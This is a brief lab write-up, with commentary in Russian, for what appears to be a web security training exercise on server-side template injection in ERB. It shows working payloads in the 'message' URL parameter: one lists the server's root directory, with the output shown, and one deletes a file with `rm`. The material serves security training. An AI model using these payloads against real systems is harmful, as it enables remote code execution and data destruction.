# Basic server-side template injection
PRACTITIONER

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

## Решение
При открытии первого товара открывается страница `/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`.

В условии сказано, что приложение использует ERB в качестве шаблонизатора. Попробую передать в качестве значения параметра message следующую строку:
```
<%= `ls /` %>
```
Работает:
```
<div>academy
bin
boot
dev
ecs-execute-command-5b77d449-f933-4204-a8fb-3db51b0b258b
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</div>
```
Удаление файла morale.txt из домашнего каталога пользователя carlos:
```
?message=<%= `rm /home/carlos/morale.txt` %>
```
Задание выполнено.